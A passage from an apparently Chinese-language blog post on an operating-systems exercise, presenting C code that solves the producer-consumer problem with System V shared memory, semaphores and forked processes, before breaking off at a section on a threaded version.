class="hljs-comment">//缓冲区里字母数量</span><br><span class="hljs-keyword">int</span> is_empty;<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_CONSUMER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//消费者数量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_PRODUCER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//生产者数量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_BUFFER = <span class="hljs-number">10</span>;   <span class="hljs-comment">//缓冲区容量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//工作次数</span><br><br><span class="hljs-keyword">int</span> shm_id = <span class="hljs-number">-1</span>;<span class="hljs-comment">//信号量id</span><br><br><span class="hljs-keyword">int</span> sem_id = <span class="hljs-number">-1</span>;<span class="hljs-comment">//共享内存id</span><br><span class="hljs-comment">//子进程的id</span><br><span class="hljs-keyword">pid_t</span> consumer_id;<br><span class="hljs-keyword">pid_t</span> producer_id;<br><span class="hljs-comment">//得到10以内的一个随机数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_random</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-comment">//sem_id 表示信号量集合的 id</span></span><br><span class="hljs-function"><span class="hljs-comment">//sem_num 表示要处理的信号量在信号量集合中的索引</span></span><br><span class="hljs-function"><span class="hljs-comment">//P操作</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"><span class="hljs-comment">//V操作</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">signalSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"><span class="hljs-comment">//打印进程运行时间</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-comment">//消费者进程的消费和信息打印</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br><span class="hljs-function"><span class="hljs-comment">//消费者进程的消费和信息打印</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br></code></pre></td></tr></table></figure><h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><p>在main函数中，首先初始化信号量（mutex表示缓冲区的互斥访问，设为1；SEM_FULL表示缓冲区满的数量，设为0；SEM_EMPTY表示缓冲区空的数量，设为10），分配共享内存，初始化缓冲区，创建生产者与消费者，释放内存再退出。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_BUFFER_SIZE 10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SHM_MODE 0600</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_MODE 0600</span><br><span class="hljs-comment">//信号集合内的每个信号量的索引,</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_FULL 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_EMPTY 1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MUTEX 2</span><br><span class="hljs-comment">//缓冲区结构</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> out;<br><span class="hljs-keyword">int</span> in;<br><span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br><span class="hljs-keyword">int</span> num; <span class="hljs-comment">//缓冲区里字母数量</span><br><span class="hljs-keyword">int</span> is_empty;<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_CONSUMER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//消费者数量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_PRODUCER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//生产者数量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_BUFFER = <span class="hljs-number">10</span>;   <span class="hljs-comment">//缓冲区容量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//工作次数</span><br><span class="hljs-comment">//信号量id</span><br><span class="hljs-keyword">int</span> shm_id = <span class="hljs-number">-1</span>;<br><span class="hljs-comment">//共享内存id</span><br><span class="hljs-keyword">int</span> sem_id = <span class="hljs-number">-1</span>;<br><span class="hljs-comment">//子进程的id</span><br><span class="hljs-keyword">pid_t</span> consumer_id;<br><span class="hljs-keyword">pid_t</span> producer_id;<br><span class="hljs-comment">//得到10以内的一个随机数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_random</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> digit;<br>digit = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">3</span>;<br><span class="hljs-keyword">return</span> digit;<br>&#125;<br><br><span class="hljs-comment">//得到A～Z的一个随机字母</span><br><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">getRandChar</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> letter;<br>letter = (<span class="hljs-keyword">char</span>)((<span class="hljs-built_in">rand</span>() % <span class="hljs-number">26</span>) + <span class="hljs-string">&#x27;A&#x27;</span>);<br><span class="hljs-keyword">return</span> letter;<br>&#125;<br><br><span class="hljs-comment">//sem_id 表示信号量集合的 id</span><br><span class="hljs-comment">//sem_num 表示要处理的信号量在信号量集合中的索引</span><br><span class="hljs-comment">//P操作</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sb</span>;</span><br>sb.sem_num = sem_num;<br>sb.sem_op = <span class="hljs-number">-1</span>; <span class="hljs-comment">//表示要把信号量减一</span><br>sb.sem_flg = <span class="hljs-number">0</span>; <span class="hljs-comment">//</span><br><span class="hljs-comment">//第二个参数是 sembuf [] 类型的，表示数组</span><br><span class="hljs-comment">//第三个参数表示 第二个参数代表的数组的大小</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semop</span>(sem_id, &amp;sb, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;waitSem failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//V操作</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">signalSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sb</span>;</span><br>sb.sem_num = sem_num;<br>sb.sem_op = <span class="hljs-number">1</span>;<br>sb.sem_flg = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//第二个参数是 sembuf [] 类型的，表示数组</span><br><span class="hljs-comment">//第三个参数表示 第二个参数代表的数组的大小</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semop</span>(sem_id, &amp;sb, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;signalSem failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//打印进程运行时间</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//打印时间</span><br><span class="hljs-keyword">time_t</span> now;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">timenow</span>;</span> <span class="hljs-comment">//实例化tm结构指针</span><br><span class="hljs-built_in">time</span>(&amp;now);<br>timenow = <span class="hljs-built_in">localtime</span>(&amp;now);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %02d:%02d:%02d   |  &quot;</span>, timenow-&gt;tm_hour, timenow-&gt;tm_min, timenow-&gt;tm_sec);<br>&#125;<br><span class="hljs-comment">//生产者进程的生产和信息打印</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">produce_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//sleep(get_random()); //随机睡眠一段时间，相当于人为扩大进程执行操作时间</span><br><span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//程序运行时间</span><br><span class="hljs-comment">//生产产品</span><br><span class="hljs-keyword">char</span> c = <span class="hljs-built_in">getRandChar</span>(); <span class="hljs-comment">//随机获取字母</span><br>shmptr-&gt;str[shmptr-&gt;in] = c;<br>shmptr-&gt;in = (shmptr-&gt;in + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>shmptr-&gt;is_empty = <span class="hljs-number">0</span>; <span class="hljs-comment">//写入新产品</span><br>shmptr-&gt;num++;<br><span class="hljs-comment">//打印缓冲区</span><br><span class="hljs-keyword">int</span> p = (shmptr-&gt;in - <span class="hljs-number">1</span> &gt;= shmptr-&gt;out) ? (shmptr-&gt;in - <span class="hljs-number">1</span>) : (shmptr-&gt;in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br><span class="hljs-keyword">for</span> (p; !(shmptr-&gt;is_empty) &amp;&amp; p &gt;= shmptr-&gt;out; p--)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, shmptr-&gt;str[p % MAX_BUFFER_SIZE]);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - shmptr-&gt;num; j++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);  <span class="hljs-comment">//控制输出格式</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;producer_%d   |    &quot;</span>, i + <span class="hljs-number">1</span>); <span class="hljs-comment">//进程id信息</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;+ %c    |\n&quot;</span>, c); <span class="hljs-comment">//进程操作</span><br><span class="hljs-built_in">fflush</span>(stdout);<br>&#125;<br><span class="hljs-comment">//消费者进程的消费和信息打印</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//sleep(get_random());</span><br><span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//程序运行时间</span><br><span class="hljs-comment">/*生产产品*/</span><br><span class="hljs-keyword">char</span> lt = shmptr-&gt;str[shmptr-&gt;out];<br>shmptr-&gt;out = (shmptr-&gt;out + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>shmptr-&gt;is_empty = (shmptr-&gt;out == shmptr-&gt;in); <span class="hljs-comment">//</span><br>shmptr-&gt;num--;<br><span class="hljs-comment">//打印缓冲区</span><br><span class="hljs-keyword">int</span> p = (shmptr-&gt;in - <span class="hljs-number">1</span> &gt;= shmptr-&gt;out) ? (shmptr-&gt;in - <span class="hljs-number">1</span>) : (shmptr-&gt;in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br><span class="hljs-keyword">for</span> (p; !(shmptr-&gt;is_empty) &amp;&amp; p &gt;= shmptr-&gt;out; p--)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, shmptr-&gt;str[p % MAX_BUFFER_SIZE]);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - shmptr-&gt;num; j++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);  <span class="hljs-comment">//控制输出格式</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;consumer_%d   |    &quot;</span>, i + <span class="hljs-number">1</span>); <span class="hljs-comment">//进程id信息</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- %c    |\n&quot;</span>, lt); <span class="hljs-comment">//进程操作</span><br><span class="hljs-built_in">fflush</span>(stdout);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">srand</span>((<span class="hljs-keyword">unsigned</span>)(<span class="hljs-built_in">getpid</span>() + <span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)));<br>shm_id = <span class="hljs-built_in">shmget</span>(IPC_PRIVATE, MAX_BUFFER_SIZE, SHM_MODE); <span class="hljs-comment">//申请共享内存</span><br><span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;create shared memory failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span> *<span class="hljs-title">shmptr</span>;</span><br>shmptr = <span class="hljs-built_in">shmat</span>(shm_id, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">//将申请的共享内存附加到申请通信的进程空间</span><br><span class="hljs-keyword">if</span> (shmptr == (<span class="hljs-keyword">void</span> *)<span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;add buffer to using process space failed！\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ((sem_id = <span class="hljs-built_in">semget</span>(IPC_PRIVATE, <span class="hljs-number">3</span>, SEM_MODE)) &lt; <span class="hljs-number">0</span>)<br>&#123; <span class="hljs-comment">//创建三个信号量，SEM_EMPTY,SEM_FULL和MUTEX</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;create semaphore failed! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semctl</span>(sem_id, SEM_FULL, SETVAL, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>&#123; <span class="hljs-comment">//将索引为0的信号量设置为0--&gt;SEM_FULL</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;sem set value error! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semctl</span>(sem_id, SEM_EMPTY, SETVAL, <span class="hljs-number">10</span>) == <span class="hljs-number">-1</span>)<br>&#123; <span class="hljs-comment">//将索引为1的信号量设置为10--&gt;SEM_EMPTY</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;sem set value error! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semctl</span>(sem_id, MUTEX, SETVAL, <span class="hljs-number">1</span>) == <span class="hljs-number">-1</span>)<br>&#123; <span class="hljs-comment">//将索引为3的信号量设置为1--&gt;MUTEX</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;sem set value error! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">//初始化缓冲区</span><br>shmptr-&gt;out = <span class="hljs-number">0</span>;<br>shmptr-&gt;in = <span class="hljs-number">0</span>;<br>shmptr-&gt;is_empty = <span class="hljs-number">1</span>;<br>shmptr-&gt;num = <span class="hljs-number">0</span>;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------Process Execution Table-----------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|     time     |  buffer data  |current  process| operation |\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N_PRODUCER; i++)<br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br>producer_id = fork();<br><br><span class="hljs-keyword">if</span> (producer_id &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;the fork failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (producer_id == <span class="hljs-number">0</span>) <span class="hljs-comment">//是子进程则执行生产操作</span><br>&#123;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; N_WORKTIME; j++)<br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br><span class="hljs-built_in">waitSem</span>(sem_id, SEM_EMPTY);<br><span class="hljs-built_in">waitSem</span>(sem_id, MUTEX);<br><br><span class="hljs-built_in">produce_print</span>(i, shmptr);<br><br><span class="hljs-built_in">signalSem</span>(sem_id, MUTEX);<br><span class="hljs-built_in">signalSem</span>(sem_id, SEM_FULL);<br>&#125;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N_CONSUMER; i++)<span class="hljs-comment">//</span><br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br>consumer_id = fork();<br><br><span class="hljs-keyword">if</span> (consumer_id &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//调用fork失败</span><br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;the fork failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (consumer_id == <span class="hljs-number">0</span>) <span class="hljs-comment">//是子进程则执行消费操作</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; N_WORKTIME; j++)<br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br><span class="hljs-built_in">waitSem</span>(sem_id, SEM_FULL);<br><span class="hljs-built_in">waitSem</span>(sem_id, MUTEX);<br><br><span class="hljs-built_in">consume_print</span>(i, shmptr);<br><br><span class="hljs-built_in">signalSem</span>(sem_id, MUTEX);<br><span class="hljs-built_in">signalSem</span>(sem_id, SEM_EMPTY);<br>&#125;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//主进程最后退出</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">wait</span>(<span class="hljs-number">0</span>) != <span class="hljs-number">-1</span>)<br>;<br><span class="hljs-comment">//将共享段与进程之间解除连接</span><br><span class="hljs-built_in">shmdt</span>(shmptr);<br><span class="hljs-comment">//对共享内存区执行控制操作</span><br><span class="hljs-built_in">shmctl</span>(shm_id, IPC_RMID, <span class="hljs-number">0</span>); <span class="hljs-comment">//当cmd为IPC_RMID时，删除该共享段</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;主进程运行结束！\n&quot;</span>);<br><br><span class="hljs-built_in">fflush</span>(stdout);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="程序初值和运行结果"><a href="#程序初值和运行结果" class="headerlink" title="程序初值和运行结果"></a>程序初值和运行结果</h4><p>进程</p><p><img src="/2021/11/30/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0/image-20211130090602101.png" alt="image-20211130090602101"></p><p><img src="/2021/11/30/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0/image-20211130090745719.png" alt="image-20211130090745719"></p><h3 id="线程实现"><a href="#线程实现" class="headerlink" title="线程实现"></a>线程实现</h3><h4 id="预备知识-1"><a href="#预备知识-1" class="headerlink" 